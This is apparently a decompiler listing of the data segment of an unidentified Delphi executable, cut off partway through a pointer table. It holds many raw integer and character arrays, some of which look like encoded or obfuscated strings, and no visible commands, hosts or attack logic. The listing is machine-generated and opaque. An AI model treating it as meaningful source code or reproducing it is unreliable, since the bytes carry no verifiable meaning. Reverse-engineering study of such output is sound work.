_UNKNOWN loc_40CE58; // weak
_UNKNOWN loc_40CE6E; // weak
_UNKNOWN loc_40CE75; // weak
_UNKNOWN loc_40CF00; // weak
_UNKNOWN loc_40CF07; // weak
_UNKNOWN loc_40CF1D; // weak
_UNKNOWN loc_40CF24; // weak
_UNKNOWN loc_40CFDF; // weak
_UNKNOWN loc_40CFE6; // weak
_UNKNOWN loc_40D004; // weak
_UNKNOWN loc_40D00B; // weak
_UNKNOWN loc_40D05B; // weak
_UNKNOWN loc_40D062; // weak
_UNKNOWN loc_40D0B5; // weak
_UNKNOWN loc_40D0BC; // weak
_UNKNOWN loc_40D13F; // weak
_UNKNOWN loc_40D146; // weak
_UNKNOWN loc_40D1E3; // weak
_UNKNOWN loc_40D1EA; // weak
_UNKNOWN loc_40D200; // weak
_UNKNOWN loc_40D207; // weak
_UNKNOWN loc_40D286; // weak
_UNKNOWN loc_40D28D; // weak
_UNKNOWN loc_40DB48; // weak
_UNKNOWN loc_40DB4F; // weak
_UNKNOWN loc_40DD17; // weak
_UNKNOWN loc_40DD1E; // weak
_UNKNOWN loc_40DD9F; // weak
_UNKNOWN loc_40DDA6; // weak
_UNKNOWN loc_40DF9C; // weak
_UNKNOWN loc_40DFA3; // weak
_UNKNOWN loc_40E209; // weak
_UNKNOWN loc_40E210; // weak
_UNKNOWN loc_40E251; // weak
_UNKNOWN loc_40E258; // weak
_UNKNOWN loc_40E3B1; // weak
_UNKNOWN loc_40E3B8; // weak
_UNKNOWN loc_40E47C; // weak
_UNKNOWN loc_40E550; // weak
int dword_40E5B0[5] = { 1699890450, 1953720679, 2017818994, 1953523043, -1871810711 }; // weak
int dword_40E610[2] = { 14, 65536 }; // weak
_UNKNOWN loc_40E8CD; // weak
_UNKNOWN loc_40E8D4; // weak
_UNKNOWN loc_40EB48; // weak
_UNKNOWN loc_40EB89; // weak
_UNKNOWN loc_40EE9C; // weak
_UNKNOWN loc_40EEA3; // weak
_UNKNOWN loc_40F334; // weak
_UNKNOWN loc_40F33B; // weak
_UNKNOWN loc_40F36D; // weak
_UNKNOWN loc_40F48F; // weak
_UNKNOWN loc_40F496; // weak
int dword_40F4A0[4] = { -2, 0, 0, 0 }; // weak
int dword_40F4C8 = 61; // weak
_UNKNOWN loc_40F5FA; // weak
_UNKNOWN loc_40F601; // weak
_UNKNOWN loc_40F679; // weak
_UNKNOWN loc_40F779; // weak
int dword_40F7D8[2] = { 14, 65536 }; // weak
int (*off_40F8D4)() = &sub_410188; // weak
_UNKNOWN loc_40FA7D; // weak
_UNKNOWN loc_40FA84; // weak
_UNKNOWN loc_40FB53; // weak
_UNKNOWN loc_40FB5A; // weak
_UNKNOWN loc_40FC4B; // weak
_UNKNOWN loc_40FC52; // weak
_UNKNOWN loc_40FEDB; // weak
_UNKNOWN loc_40FEE2; // weak
int dword_40FEF4[3] = { 10, -1, 2 }; // weak
int dword_40FF00 = 2573; // weak
_UNKNOWN loc_41002B; // weak
_UNKNOWN loc_410032; // weak
_UNKNOWN loc_4100DF; // weak
_UNKNOWN loc_41074A; // weak
_UNKNOWN loc_410751; // weak
int dword_410760[3] = { 19279, -1, 23 }; // weak
_UNKNOWN loc_410E7D; // weak
_UNKNOWN loc_410ED9; // weak
_UNKNOWN loc_410FF1; // weak
_UNKNOWN loc_410FF8; // weak
int dword_411008[3] = { 43, -1, 1 }; // weak
int dword_411014[3] = { 45, -1, 8 }; // weak
_UNKNOWN loc_4112A2; // weak
_UNKNOWN loc_4112A9; // weak
_UNKNOWN loc_41136E; // weak
_UNKNOWN loc_411375; // weak
_UNKNOWN loc_4113FC; // weak
_UNKNOWN loc_411403; // weak
_UNKNOWN loc_411481; // weak
_UNKNOWN loc_411488; // weak
int dword_411498[3] = { 60, -1, 1 }; // weak
int dword_4114A4 = 62; // weak
_UNKNOWN loc_4115A2; // weak
_UNKNOWN loc_4115A9; // weak
int dword_4115B8[3] = { 34, -1, 1 }; // weak
int dword_4115C4[3] = { 40, -1, 1 }; // weak
int dword_4115D0[3] = { 41, -1, 1 }; // weak
int dword_4115DC = 60; // weak
_UNKNOWN loc_411631; // weak
int dword_411690[2] = { 14, 458752 }; // weak
_UNKNOWN loc_411CA9; // weak
_UNKNOWN loc_411CB0; // weak
_UNKNOWN loc_411CD8; // weak
_UNKNOWN loc_411CDF; // weak
int dword_411CF0[3] = { 61, -1, 5 }; // weak
int dword_411E18[3] = { 32, -1, 7 }; // weak
_UNKNOWN loc_411F2F; // weak
_UNKNOWN loc_411F36; // weak
int dword_411F48[3] = { 46, -1, 11 }; // weak
_UNKNOWN loc_412008; // weak
_UNKNOWN loc_41200F; // weak
_UNKNOWN loc_412143; // weak
_UNKNOWN loc_41214A; // weak
int dword_41215C[3] = { 3158589, -1, 2 }; // weak
_UNKNOWN loc_41220E; // weak
_UNKNOWN loc_412215; // weak
int dword_412220[4] = { -2, 0, 0, 0 }; // weak
_UNKNOWN loc_4122B8; // weak
_UNKNOWN loc_4122BF; // weak
_UNKNOWN loc_41235C; // weak
_UNKNOWN loc_412363; // weak
_UNKNOWN loc_4123F2; // weak
_UNKNOWN loc_4123F9; // weak
_UNKNOWN loc_412478; // weak
int dword_412544[2] = { 14, 65536 }; // weak
_UNKNOWN loc_4126BE; // weak
_UNKNOWN loc_4126C5; // weak
_UNKNOWN loc_4127DC; // weak
_UNKNOWN loc_4127E3; // weak
int dword_4127F4[3] = { 32, -1, 22 }; // weak
_UNKNOWN loc_412981; // weak
_UNKNOWN loc_412988; // weak
_UNKNOWN loc_4129AB; // weak
_UNKNOWN loc_4129B2; // weak
int dword_4129C4[3] = { 11565, -1, 9 }; // weak
_UNKNOWN loc_412B7A; // weak
_UNKNOWN loc_412B81; // weak
_UNKNOWN loc_412CA5; // weak
int dword_412D04[2] = { 14, 131072 }; // weak
_UNKNOWN loc_412E81; // weak
_UNKNOWN loc_412E88; // weak
int dword_412E9C = 45; // weak
_UNKNOWN loc_412F3F; // weak
_UNKNOWN loc_412F46; // weak
_UNKNOWN loc_41302F; // weak
_UNKNOWN loc_413036; // weak
_UNKNOWN loc_4130EB; // weak
_UNKNOWN loc_4130F2; // weak
_UNKNOWN loc_413212; // weak
_UNKNOWN loc_413219; // weak
int dword_41323C[3] = { 46, -1, 2 }; // weak
int dword_413248[3] = { 2573, -1, 3 }; // weak
_UNKNOWN loc_413333; // weak
_UNKNOWN loc_41333A; // weak
_UNKNOWN loc_413355; // weak
_UNKNOWN loc_41335C; // weak
_UNKNOWN loc_41338D; // weak
int dword_4133A4[5] = { 1129580033, 1919904879, 4, -128, 4230527 }; // weak
int dword_413404[4] = { 1850295567, 1768710518, 1634879332, 1667852400 }; // weak
int dword_413460[7] =
{
  1850295576,
  1768710518,
  1634879332,
  1667852400,
  1919250511,
  1869182049,
  4230510
}; // weak
int dword_413480[6] = { 1179913217, 1131703919, 1936875880, 95333, -16777216, -1879048192 }; // weak
void *off_4134E4 = &loc_40C630; // weak
int (*off_413628)() = &sub_4155D4; // weak
void *off_413684 = &loc_40C630; // weak
int dword_413758[5] = { 1699894288, 1920298867, 1632462179, 1701273966, 4230514 }; // weak
_UNKNOWN loc_413EA1; // weak
_UNKNOWN loc_413EA8; // weak
_UNKNOWN loc_413EC9; // weak
_UNKNOWN loc_413ED0; // weak
_UNKNOWN loc_413F76; // weak
_UNKNOWN loc_413F7D; // weak
_UNKNOWN loc_41405D; // weak
_UNKNOWN loc_414064; // weak
_UNKNOWN loc_414118; // weak
_UNKNOWN loc_41411F; // weak
_UNKNOWN loc_414422; // weak
_UNKNOWN loc_414429; // weak
_UNKNOWN loc_4144C8; // weak
_UNKNOWN loc_4144CF; // weak
_UNKNOWN loc_4145A1; // weak
_UNKNOWN loc_4145A8; // weak
_UNKNOWN loc_414632; // weak
_UNKNOWN loc_414639; // weak
_UNKNOWN loc_41477C; // weak
_UNKNOWN loc_414862; // weak
_UNKNOWN loc_414869; // weak
_UNKNOWN loc_41491C; // weak
_UNKNOWN loc_414923; // weak
_UNKNOWN loc_41493C; // weak
_UNKNOWN loc_414943; // weak
_UNKNOWN loc_414AD1; // weak
_UNKNOWN loc_414AD8; // weak
_UNKNOWN loc_414C9C; // weak
_UNKNOWN loc_414CA3; // weak
_UNKNOWN loc_414CBF; // weak
_UNKNOWN loc_414CC6; // weak
_UNKNOWN loc_414CDF; // weak
_UNKNOWN loc_414CE6; // weak
_UNKNOWN loc_414ED5; // weak
_UNKNOWN loc_414EDC; // weak
_UNKNOWN loc_4150BF; // weak
_UNKNOWN loc_4150C6; // weak
_UNKNOWN loc_4150E6; // weak
_UNKNOWN loc_4150ED; // weak
_UNKNOWN loc_4152FC; // weak
_UNKNOWN loc_415303; // weak
_UNKNOWN loc_415319; // weak
_UNKNOWN loc_415320; // weak
_UNKNOWN loc_41537C; // weak
_UNKNOWN loc_415383; // weak
_UNKNOWN loc_415407; // weak
_UNKNOWN loc_41540E; // weak
_UNKNOWN loc_4154AA; // weak
_UNKNOWN loc_4154B1; // weak
_UNKNOWN loc_4154D2; // weak
_UNKNOWN loc_4154D9; // weak
_UNKNOWN loc_415574; // weak
_UNKNOWN loc_41557B; // weak
_UNKNOWN loc_415869; // weak
_UNKNOWN loc_41591F; // weak
_UNKNOWN loc_415988; // weak
int dword_415B3C[4] = { -2106818033, 1870798962, 1451447171, 1317233283 }; // weak
int dword_415B98[4] = { 1632654351, 1919251572, 1851870574, 1919248225 }; // weak
_UNKNOWN loc_415C6F; // weak
_UNKNOWN loc_415C76; // weak
_UNKNOWN loc_415D65; // weak
_UNKNOWN loc_415E99; // weak
_UNKNOWN loc_415F9C; // weak
_UNKNOWN loc_415FA3; // weak
_UNKNOWN loc_41608C; // weak
_UNKNOWN loc_416093; // weak
_UNKNOWN loc_41616A; // weak
_UNKNOWN loc_416171; // weak
_UNKNOWN loc_4161FD; // weak
_UNKNOWN loc_416204; // weak
_UNKNOWN loc_4162CE; // weak
_UNKNOWN loc_4162D5; // weak
_UNKNOWN loc_41638C; // weak
_UNKNOWN loc_416393; // weak
_UNKNOWN loc_416468; // weak
_UNKNOWN loc_41646F; // weak
_UNKNOWN loc_416673; // weak
_UNKNOWN loc_41667A; // weak
_UNKNOWN loc_4168AD; // weak
_UNKNOWN loc_4168B4; // weak
int dword_4168C4[3] = { 51, -1, 3 }; // weak
int dword_4168D0[3] = { 3359814, -1, 8 }; // weak
int dword_4168F0[3] = { -2139725973, 2104513874, 0 }; // weak
int dword_416904[3] = { 50, -1, 1 }; // weak
int dword_416910[3] = { 53, -1, 1 }; // weak
int dword_41691C[3] = { 56, -1, 1 }; // weak
int dword_416928 = 57; // weak
_UNKNOWN loc_416A09; // weak
_UNKNOWN loc_416A10; // weak
_UNKNOWN loc_416B0F; // weak
_UNKNOWN loc_416B16; // weak
_UNKNOWN loc_416C45; // weak
_UNKNOWN loc_416C4C; // weak
_UNKNOWN loc_416F90; // weak
_UNKNOWN loc_416F97; // weak
int dword_416FA4[3] = { 49, -1, 3 }; // weak
int dword_416FB0[3] = { 3621958, -1, 1 }; // weak
int dword_416FBC[3] = { 46, -1, 1 }; // weak
int dword_416FE4[3] = { 53, -1, 5 }; // weak
int dword_417000[3] = { 57, -1, 5 }; // weak
int dword_41701C[3] = { 7176047, -1, 52 }; // weak
int dword_417028[14] =
{
  -1365268594,
  -1616143950,
  -1650293353,
  -1448302675,
  -1852461919,
  -1449285980,
  2106960818,
  -1616139600,
  -1617974103,
  -1448957011,
  -1434807127,
  -1685497685,
  -1767071569,
  0
}; // weak
int dword_417068[3] = { 7042670, -1, 12 }; // weak
int dword_417074[4] = { 1769961834, 1081442946, 1853261944, 0 }; // weak
int dword_41708C[4] = { 1988329322, 1081438563, 1853261944, 0 }; // weak
int dword_4170A4[3] = { 8090498, -1, 10 }; // weak
int dword_4170B0[5] = { 1970439766, -2005648259, 27254, -1, 3 }; // weak
int dword_4170C4[3] = { 7893124, -1, 11 }; // weak
int dword_4170D0[5] = { -1954645879, 1983807355, 7107722, -1, 38 }; // weak
int dword_4170E4[12] =
{
  -1868980321,
  1583257241,
  -1851551909,
  -1852596915,
  1583257241,
  -1734898085,
  -1852081831,
  -1952552037,
  1889116031,
  30329,
  -1,
  1
}; // weak
_UNKNOWN loc_4171B2; // weak
_UNKNOWN loc_4171B9; // weak
_UNKNOWN loc_4172D2; // weak
_UNKNOWN loc_4172D9; // weak
int dword_4173E0[3] = { 50, -1, 2 }; // weak
int dword_4173EC = 25459; // weak
_UNKNOWN loc_4174A1; // weak
_UNKNOWN loc_4174A8; // weak
_UNKNOWN loc_41759F; // weak
_UNKNOWN loc_4175A6; // weak
_UNKNOWN loc_417795; // weak
_UNKNOWN loc_41779C; // weak
int dword_4177AC[3] = { 64, -1, 1 }; // weak
int dword_4177B8 = 46; // weak
_UNKNOWN loc_417915; // weak
_UNKNOWN loc_41791C; // weak
_UNKNOWN loc_417BCB; // weak
_UNKNOWN loc_417BD2; // weak
int dword_417BE4[3] = { 92, -1, 3 }; // weak
int dword_417BF0[3] = { 2764330, -1, 1 }; // weak
int dword_417BFC[3] = { 46, -1, 2 }; // weak
int dword_417C08 = 11822; // weak
int dword_417C10[2] = { 825098769, 4 }; // weak
_UNKNOWN loc_417C7C; // weak
_UNKNOWN loc_417C83; // weak
_UNKNOWN loc_417D7E; // weak
_UNKNOWN loc_417D85; // weak
_UNKNOWN loc_417EF5; // weak
_UNKNOWN loc_417EFC; // weak
_UNKNOWN loc_4182D1; // weak
_UNKNOWN loc_4182D8; // weak
int dword_4182E8[3] = { 53, -1, 3 }; // weak
int dword_4182F4[3] = { 3359814, -1, 5 }; // weak
int dword_418300[4] = { 897151359, 58, -1, 5 }; // weak
int dword_418330[4] = { 2138191670, 121, -1, 5 }; // weak
int dword_418350[4] = { 2005022518, 127, -1, 5 }; // weak
int dword_418360[4] = { 1954821942, 124, -1, 5 }; // weak
int dword_418370[4] = { -2089863370, 113, -1, 5 }; // weak
int dword_418380[4] = { 1820407606, 110, -1, 5 }; // weak
int dword_4183A0[3] = { 7043686, -1, 1 }; // weak
int dword_4183AC[3] = { 121, -1, 1 }; // weak
int dword_4183B8[3] = { 104, -1, 1 }; // weak
int dword_4183C4[3] = { 105, -1, 1 }; // weak
int dword_4183D0[3] = { 116, -1, 1 }; // weak
int dword_4183DC[3] = { 49, -1, 42 }; // weak
int dword_4183E8[13] =
{
  -1533698684,
  -1784574040,
  -1818723443,
  -1616732765,
  -2020892009,
  -2020904846,
  -1939640206,
  1351716744,
  -1784965257,
  -1651475375,
  35478,
  -1,
  1
}; // weak
int dword_41841C[3] = { 119, -1, 1 }; // weak
int dword_418428[3] = { 50, -1, 1 }; // weak
int dword_418434 = 100; // weak
_UNKNOWN loc_4184B7; // weak
_UNKNOWN loc_4184BE; // weak
_UNKNOWN loc_4187C9; // weak
_UNKNOWN loc_4187D0; // weak
int dword_4187E0[6] = { 2105444983, 2139454356, -2090044289, 1280072589, 2140241225, 0 }; // weak
int dword_4187F8[3] = { 14849, -1, 13 }; // weak
int dword_418804[6] = { -2021166480, 2022340227, 1953775479, 136, -1, 5 }; // weak
int dword_41882C[4] = { -2139453585, -2054652041, -2138668433, 0 }; // weak
int dword_418844[4] = { 1899576384, 28549, -1, 9 }; // weak
int dword_418854[5] = { 1115322740, -2022491326, 117, -1, 21 }; // weak
int dword_418868[6] = { -2138278570, -2021813633, 1853259137, 1314753413, -1820375218, 129 }; // weak
_UNKNOWN loc_418B06; // weak
_UNKNOWN loc_418B0D; // weak
int dword_418B1C[3] = { 50, -1, 3 }; // weak
int dword_418B28[3] = { 3621958, -1, 11 }; // weak
int dword_418B34[5] = { 1918067310, 1061307007, 7702391, -1, 53 }; // weak
int dword_418B48[16] =
{
  -1348425585,
  -1599300941,
  -1633450344,
  -1431459666,
  -1835618910,
  -1432442971,
  2123803827,
  -1599296591,
  -1601131094,
  -1432114002,
  -1332963926,
  -1382052694,
  -1600281934,
  175,
  -1,
  8
}; // weak
int dword_418B88[3] = { -2072609197, 1077968500, 0 }; // weak
int dword_418B9C[5] = { -2089196946, 1061306965, 7702391, -1, 26 }; // weak
int dword_418BB0[9] =
{
  -2038131066,
  2089061002,
  -1937471852,
  -1869710707,
  -2089055098,
  -2121495664,
  33423,
  -1,
  1
}; // weak
int dword_418C04[5] = { 1584620142, 1061307018, 7702391, -1, 7 }; // weak
int dword_418C18[4] = { 2137882465, 8159362, -1, 30 }; // weak
int dword_418C28[8] =
{
  -2020839551,
  -1818848873,
  1833145995,
  -1769433453,
  1150781331,
  -1920366476,
  -1991145592,
  34717
}; // weak
_UNKNOWN loc_418DB9; // weak
_UNKNOWN loc_418DC0; // weak
_UNKNOWN loc_418E17; // weak
_UNKNOWN loc_418E1E; // weak
_UNKNOWN loc_418EAB; // weak
_UNKNOWN loc_418EB2; // weak
_UNKNOWN loc_418F7C; // weak
_UNKNOWN loc_418F83; // weak
int dword_418F94[3] = { 3752774, -1, 1 }; // weak
int dword_418FA0[3] = { 48, -1, 1 }; // weak
int dword_418FAC[3] = { 49, -1, 3 }; // weak
_UNKNOWN loc_419035; // weak
_UNKNOWN loc_41903C; // weak
_UNKNOWN loc_419052; // weak
_UNKNOWN loc_419059; // weak
int dword_419064[2] = { 841875985, 4 }; // weak
int dword_4190BC[3] = { 49, -1, 1 }; // weak
int dword_4190C8 = 51; // weak
_UNKNOWN loc_419F4E; // weak
_UNKNOWN loc_419F55; // weak
_UNKNOWN loc_41A017; // weak
_UNKNOWN loc_41A01E; // weak
int dword_41A02C[12] =
{
  -1500012666,
  -1750888022,
  -1785037425,
  -1583046747,
  2072880281,
  -1533631327,
  1386583457,
  -1584098444,
  1386585768,
  -1818259072,
  -1901881958,
  0
}; // weak
int dword_41A064[6] = { 2071952735, 982353040, -2038269592, 2105301307, -1903719030, 0 }; // weak
int dword_41A084[5] = { 2121363537, -2105377915, 108, -1, 1 }; // weak
int dword_41A098[3] = { 92, -1, 18 }; // weak
int dword_41A0A4[7] = { 1751868268, 2038717241, 1496810114, 2106161789, 35212, -1, 11 }; // weak
int dword_41A0C0[5] = { 1633967205, -2089459150, 8549512, -1, 17 }; // weak
int dword_41A0D4[7] = { 1735025259, -1971365576, -1871216248, -2072550600, 125, -1, 14 }; // weak
int dword_41A0F0[6] = { 2021819525, 1116502398, 1116174211, 35458, -1, 1 }; // weak
int dword_41A108[3] = { 64, -1, 5 }; // weak
int dword_41A144[5] = { 2054388855, 1954298741, 132, -1, 10 }; // weak
int dword_41A158[5] = { 1903918198, 2117956468, 33398, -1, 17 }; // weak
int dword_41A16C[7] = { -2089253764, -2138933123, 2051309691, -2075884921, 144, -1, 3 }; // weak
int dword_41A188[3] = { 3490886, -1, 1 }; // weak
int dword_41A194[3] = { 49, -1, 1 }; // weak
int dword_41A1A0[3] = { 48, -1, 3 }; // weak
int dword_41A1AC[3] = { 3556422, -1, 3 }; // weak
int dword_41A1B8[3] = { 7895631, -1, 17 }; // weak
int dword_41A1C4[7] = { 2021819488, -2071627720, -1971636857, 931755660, 87, -1, 26 }; // weak
int dword_41A1E0[9] =
{
  1083346287,
  -1886616681,
  -1836106092,
  -1886155632,
  -1836695987,
  -2121760382,
  19604,
  -1,
  55
}; // weak
int dword_41A204[16] =
{
  -1436770158,
  -1398756961,
  -1313890210,
  -1348641885,
  -1280990303,
  -1632871507,
  -1369662288,
  -1436770125,
  -1566549085,
  -1297065039,
  -1414419618,
  -1587762510,
  -1498260573,
  10334129,
  -1,
  51
}; // weak
int dword_41A244[15] =
{
  -1633113473,
  -1504139604,
  -1364699233,
  -1399219297,
  -1364092838,
  1504352414,
  1504093853,
  -1705466977,
  -1566532948,
  -1437030736,
  -1386701649,
  -1700440161,
  10984360,
  -1,
  41
}; // weak
int dword_41A280[13] =
{
  -1801543563,
  -1555129182,
  -1533719147,
  1335075235,
  -1801281387,
  -1834971568,
  -1633380712,
  -1801216432,
  1335075152,
  -1818456419,
  159,
  -1,
  52
}; // weak
int dword_41A2B4[14] =
{
  -1616008320,
  1521261915,
  -1688623968,
  -1549689939,
  -1655068751,
  -1504074070,
  -1465755492,
  -1481922655,
  765631388,
  -1347790679,
  -1616488288,
  -1633769381,
  -1616008284,
  0
}; // weak
int dword_41A2F4[5] = { 909540703, 915178335, 913999480, 1435141008, 0 }; // weak
int dword_41A310[8] = { 998211183, 999262357, -2138146168, 1866090382, -2037876092, 143, -1, 49 }; // weak
int dword_41A330[15] =
{
  -1666624127,
  -1336501850,
  -1420383577,
  1470733984,
  -1667064162,
  1470406232,
  -1667586137,
  -1498786390,
  -1382572712,
  -1498458723,
  -1739151443,
  -1700811876,
  157,
  -1,
  49
}; // weak
int dword_41A36C[15] =
{
  -1499572863,
  -1336501592,
  -1705596249,
  -1621711975,
  1470538141,
  -1370056027,
  1470015905,
  -1432379988,
  -1549821096,
  -1616226915,
  -2141804135,
  -1516525480,
  156,
  -1,
  41
}; // weak
int dword_41A3A8[13] =
{
  -1634316935,
  -1471245664,
  -1689345377,
  1335072921,
  1335072164,
  -1801808234,
  -1869176496,
  1333218724,
  -1818455389,
  -1633202785,
  165,
  -1,
  54
}; // weak
int dword_41A3DC[16] =
{
  -1348164975,
  1554948957,
  1554031281,
  -1582849117,
  -1331383971,
  -1532011867,
  -1432069470,
  -1448236637,
  -1415270754,
  -1532011861,
  -1252282722,
  -1654935636,
  -1571052112,
  44204,
  -1,
  3
}; // weak
int dword_41A41C[3] = { 7105149, -1, 4 }; // weak
int dword_41A438[3] = { 1919975275, 2054778941, 0 }; // weak
int dword_41A45C[3] = { 50, -1, 4 }; // weak
int dword_41A478[3] = { 3425094, -1, 4 }; // weak
int dword_41A494[3] = { 7237754, -1, 3 }; // weak
int dword_41A4A0[3] = { 7566710, -1, 3 }; // weak
int dword_41A4AC[3] = { 8153196, -1, 3 }; // weak
int dword_41A4B8[3] = { 7698029, -1, 1 }; // weak
int dword_41A4C4[3] = { 119, -1, 1 }; // weak
int dword_41A4D0[3] = { 121, -1, 1 }; // weak
int dword_41A4DC[3] = { 104, -1, 1 }; // weak
int dword_41A4E8[3] = { 105, -1, 1 }; // weak
int dword_41A4F4[3] = { 116, -1, 4 }; // weak
int dword_41A520[3] = { 27004, -1, 4 }; // weak
int dword_41A53C[3] = { 55, -1, 3 }; // weak
int dword_41A548[3] = { 3359814, -1, 3 }; // weak
int dword_41A554[3] = { 7176047, -1, 1 }; // weak
int dword_41A560[3] = { 46, -1, 1 }; // weak
int dword_41A59C[7] = { -2004186231, -2054912372, -1937942647, 1200322695, 8750717, -1, 1 }; // weak
int dword_41A5B8[3] = { 56, -1, 3 }; // weak
int dword_41A5C4[3] = { 3687238, -1, 1 }; // weak
int dword_41A5D0[3] = { 57, -1, 4 }; // weak
_UNKNOWN loc_41A6FA; // weak
_UNKNOWN loc_41A701; // weak
int dword_41A710[3] = { 3425094, -1, 37 }; // weak
int dword_41A71C[12] =
{
  -1617913729,
  -1868789085,
  -1902938488,
  -1700947810,
  1954979218,
  -1651532390,
  1268682394,
  -1751473807,
  -1651532901,
  136,
  -1,
  18
}; // weak
int dword_41A74C[7] = { -2037480099, 2088273285, -1971299783, -2020902530, 36747, -1, 4 }; // weak
int dword_41A778 = 49; // weak
_UNKNOWN loc_41A7D1; // weak
_UNKNOWN loc_41A7D8; // weak
int dword_41A7E8 = 32; // weak
_UNKNOWN loc_41A8CB; // weak
int dword_41A8D4 = 25; // weak
_UNKNOWN loc_41B48E; // weak
_UNKNOWN loc_41B4DD; // weak
_UNKNOWN loc_41B4E4; // weak
int dword_41B4F4[6] = { 1767531113, 1516655725, -2021824910, 8483929, -1, 3 }; // weak
int dword_41B50C[3] = { 3162950, -1, 65 }; // weak
int dword_41B518[19] =
{
  -1146309477,
  -1397184833,
  -1431334236,
  -1229343558,
  -1633502802,
  -1230326863,
  -1969047361,
  -1397180483,
  -1399014986,
  -1229997894,
  -1081368138,
  -1179274824,
  -1700612179,
  -1280136528,
  -1279947928,
  -1162302804,
  164,
  -1,
  8
}; // weak
int dword_41B564[3] = { -2122354337, 2054060670, 0 }; // weak
int dword_41B578[4] = { 2021617746, 8157826, -1, 10 }; // weak
int dword_41B588[5] = { 1971415627, 2087880564, 29302, -1, 3 }; // weak
int dword_41B59C[3] = { 3228742, -1, 4 }; // weak
int dword_41B5B8[3] = { 3228486, -1, 6 }; // weak
const char str2[] =
{
  '',
  's',
  '}',
  'o',
  '@',
  '<',
  '\0',
  '\0',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\x06',
  '\0',
  '\0',
  '\0'
}; // idb
const char dword_41B5D4[] =
{
  '',
  'm',
  'l',
  'y',
  '@',
  '<',
  '\0',
  '\0',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\b',
  '\0',
  '\0',
  '\0'
}; // idb
const char dword_41B5E4[] = { '\x81', '\x81', '{', 'r', '{', 'x', '@', '@', '\0', '\0', '\0', '\0' }; // idb
int dword_41B5F8[3] = { 32, -1, 1 }; // weak
int dword_41B604[3] = { 92, -1, 9 }; // weak
int dword_41B610[5] = { 1115456130, -2022491326, 117, -1, 1 }; // weak
int dword_41B624[3] = { 50, -1, 2 }; // weak
const char dword_41B630[] =
{
  's',
  'c',
  '\0',
  '\0',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\x01',
  '\0',
  '\0',
  '\0'
}; // idb
int dword_41B63C = 56; // weak
int dword_41B650[5] = { -2089196946, 1061306965, 7702391, -1, 2 }; // weak
int dword_41B664[3] = { 8224, -1, 1 }; // weak
int dword_41B670[3] = { 49, -1, 3 }; // weak
int dword_41B67C[3] = { 3294278, -1, 1 }; // weak
int dword_41B688[3] = { 48, -1, 3 }; // weak
int dword_41B694 = 3752774; // weak
int dword_41B698 = 3551490; // weak
int dword_41B69C[3] = { 3158274, -1, 3 }; // weak
int dword_41B6A8[3] = { 3359814, -1, 3 }; // weak
int dword_41B6B4[3] = { 3290420, -1, 2 }; // weak
int dword_41B6C0[3] = { 23610, -1, 4 }; // weak
const char b[] =
{
  '',
  '',
  '',
  '',
  's',
  '',
  '',
  '',
  'b',
  '',
  '~',
  '',
  'u',
  '',
  '',
  '',
  '~',
  '',
  'q',
  '',
  '',
  '',
  '\x8F',
  '',
  's',
  '',
  '',
  '',
  '',
  '',
  '}',
  '',
  '}',
  '',
  '',
  'w',
  '\x8F',
  'z',
  '',
  '',
  '\x8D',
  '\0',
  '\0',
  '\0',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  'Y',
  '\0',
  '\0',
  '\0'
}; // idb
const char dword_41B710[] =
{
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  '\x7F',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  '\x7F',
  '',
  '',
  '',
  '\x7F',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  '}',
  '\a',
  '\x7F',
  '',
  '\x8D',
  '',
  '\x90',
  '',
  '\x8F',
  '',
  '',
  '',
  '}',
  '',
  '',
  '',
  '',
  '~',
  '',
  '',
  '}',
  '\x8D',
  '\x7F',
  '',
  '',
  '',
  '',
  '',
  '}',
  '',
  '',
  '',
  '',
  '~',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  '\x7F',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  '}',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  '\0',
  '\0',
  '\0',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\v',
  '\0',
  '\0',
  '\0'
}; // idb
int dword_41B774[5] = { -2089196946, 1065185365, 8620133, -1, 6 }; // weak
__int16 word_41C000 = 4914; // weak
char byte_41C008 = '\0'; // weak
char byte_41C00C = '\0'; // weak
char byte_41C010 = '\0'; // weak
int dword_41C014 = 0; // weak
int dword_41C018 = 0; // weak
int (__cdecl *off_41C01C)(_DWORD) = &System::SysGetMem; // weak
int (*off_41C020)(void) = &System::SysFreeMem; // weak
int (__cdecl *off_41C024)(_DWORD) = &System::SysReallocMem; // weak
CHAR Text[16] = "Runtime error   "; // idb
char aAt00000000[14] = "  at 00000000"; // weak
CHAR Caption[] = "Error"; // idb
char byte_41C050[16] =
{
  '0',
  '1',
  '2',
  '3',
  '4',
  '5',
  '6',
  '7',
  '8',
  '9',
  'A',
  'B',
  'C',
  'D',
  'E',
  'F'
}; // idb
char asc_41C060[64] = "                                                                "; // weak
char asc_41C0A0[2] = "\r\n"; // weak
_DWORD dword_41C0A4 = 0; // idb
int dword_41C0A8 = 0; // weak
int dword_41C0B4 = 0; // weak
int dword_41C0C0 = 0; // weak
int dword_41C0C4 = 0; // weak
int dword_41C0C8 = 0; // weak
int dword_41C0CC = 0; // weak
BYTE *dword_41C0D0 = NULL; // idb
_UNKNOWN unk_41C0D4; // weak
signed __int32 dword_41C104[8] = { 0, 0, 0, 0, 0, 0, 0, 0 }; // idb
int *off_41C124 = &dword_406BF4; // weak
int (__stdcall *dword_41C128)(_DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
DWORD dwDesiredAccess[3] = { 2147483648u, 1073741824u, 3221225472u }; // idb
DWORD dwShareMode = 0u; // idb
int **off_41C14C[2] = { &off_405FC4, &off_405FCC }; // weak
float flt_41C154 =  8.64e7; // weak
int dword_41C158 = 86400000; // weak
unsigned __int8 byte_41C15C[4] = { 37u, 46u, 42u, 100u }; // idb
int **off_41C160[38] =
{
  &off_40605C,
  &off_406064,
  &off_40606C,
  &off_406074,
  &off_40607C,
  &off_406084,
  &off_40608C,
  &off_406094,
  &off_40609C,
  &off_4060A4,
  &off_4060AC,
  &off_4060B4,
  &off_4060BC,
  &off_4060C4,
  &off_4060CC,
  &off_4060D4,
  &off_4060DC,
  &off_4060E4,
  &off_4060EC,
